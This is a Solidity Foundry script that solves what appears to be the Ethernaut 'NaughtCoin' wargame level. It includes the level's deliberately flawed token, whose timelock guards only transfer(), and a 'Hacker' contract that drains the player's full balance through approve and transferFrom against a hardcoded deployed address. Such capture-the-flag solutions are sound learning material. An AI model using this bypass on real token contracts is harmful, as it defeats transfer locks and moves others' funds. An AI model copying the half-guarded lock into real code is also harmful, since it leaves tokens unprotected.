// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';
import "forge-std/Script.sol";


//  interface IERC20 {
//   function approve(address spender, uint256 amount) external returns (bool);
//   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
//   function balanceOf(address account) external view returns (uint256);
// }

interface INaughtCoin {
  function player() external view returns(address);
}

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

contract Hacker {
    function hack (address player, uint256 balance, IERC20 erc20) public {
        erc20.transferFrom(player, address(this), balance);
    }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        address naught = 0xe86aD0CE96D53194c4E49c8009946Eaf937f3Ae8;
        NaughtCoin naughtCoin = NaughtCoin(naught);
        Hacker hacker = new Hacker();
        address player = naughtCoin.player();
        IERC20 erc20 = IERC20(address(naught));
        uint256 balance = erc20.balanceOf(player);
        erc20.approve(address(hacker), balance);
        hacker.hack(player, balance, erc20);
        vm.stopBroadcast();
    }
}